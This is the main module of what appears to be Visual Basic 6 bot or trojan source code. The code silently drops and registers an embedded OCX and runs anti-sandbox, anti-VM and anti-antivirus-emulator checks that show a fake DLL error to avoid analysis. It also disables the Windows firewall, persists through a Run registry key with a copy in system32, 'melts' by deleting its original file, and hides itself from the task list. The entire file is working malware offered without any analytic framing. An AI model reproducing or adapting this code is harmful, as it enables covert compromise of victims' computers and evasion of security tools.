Attribute VB_Name = "modMain"

Dim strOldFile As String
Dim strNewFile As String
Dim buffer() As Byte

Sub Main()
On Error Resume Next

log ("Logfile is Open")



If FileExists(Environ("homedrive") & "\mswinsck.ocx") = False Then
log ("Load OCX")
buffer = LoadResData(101, "CUSTOM")
buffer = StrReverse(buffer)
Open Environ("homedrive") & "\mswinsck.ocx" For Binary As #1
Put #1, , buffer()
Close #1
Shell ("regsvr32 /s " & Environ("homedrive") & "\mswinsck.ocx")
log ("Load OCX End")
End If

log ("Get Info")
Call GetInfo
log ("Get Info End")


If antisand = "1" Then
log ("Antisand")
If Sandboxed() Then
log ("Sandbox found")
MsgBox "Eine DLL-Initialisierungsroutine ist fehlgeschlagen.", vbCritical, "Fehler!"
End
End If
log ("Antisand END")
End If

If antinorman = "1" Then
log ("Anti Norman")
If Environ("username") = "CurrentUser" Then
log ("Norman found")
MsgBox "Eine DLL-Initialisierungsroutine ist fehlgeschlagen.", vbCritical, "Fehler!"
End
End If
log ("Anti Norman END")
End If

If antivm = "1" Then
log ("Anti VM")
Call vm
log ("Anti VM END")
End If


log ("Search for Running Instance")
a = DateTime.Time
b = DateTime.Hour(a)
c = DateTime.Minute(a)

If GetSettingString(HKEY_LOCAL_MACHINE, "Software\Intel", "Instance", "0") = b & c Then
log ("Running Instance was found")
End
Else
log ("Trying to Set Instance Key")
SaveSettingString HKEY_LOCAL_MACHINE, "Software\Intel", "Instance", b & c
log ("Instance Key was set")
End If





If antixpfw = "1" Then
log ("antifw")
Dim XPFirewall As Object
Dim XPFirewallpolicy As Object

Set XPFirewall = CreateObject("HNetCfg.FwMgr")
Set XPFirewallpolicy = XPFirewall.LocalPolicy.CurrentProfile

If XPFirewallpolicy.FirewallEnabled = True Then
XPFirewallpolicy.FirewallEnabled = False
log ("antivfw True End")
End If
log ("antivfw False End")
End If

If startup = "1" Then
log ("startup")
SaveSettingString HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", process, Environ("windir") & "\system32\" & process

If LCase(App.Path) & "\" & LCase(App.EXEName) & ".exe" <> LCase(Environ("windir") & "\system32\" & LCase(process)) Then
strOldFile = App.Path & "\" & App.EXEName & ".exe"
strNewFile = Environ("windir") & "\system32\" & process
FileCopy strOldFile, strNewFile
End If
log ("startup end")
End If
    

If melt = "1" Then
log ("melt")
If LCase(App.Path) & "\" & LCase(App.EXEName) & ".exe" <> LCase(Environ("windir") & "\system32\" & LCase(process)) Then
strOldFile = App.Path & "\" & App.EXEName & ".exe"
strNewFile = Environ("windir") & "\system32\" & process
FileCopy strOldFile, strNewFile
DeleteValue HKEY_LOCAL_MACHINE, "Software\Intel", "Instance"
Shell Environ("windir") & "\system32\" & process
log ("melt Bot started")
log ("melt Kill END")
Call Selfdestruction
End If
log ("melt END")
End If




log ("Load Complete")
Form1.Form_Load
App.TaskVisible = False

If antisniff = "1" Then
log ("Anti Sniff enabled")
Form1.Timer1.Enabled = True
End If



End Sub

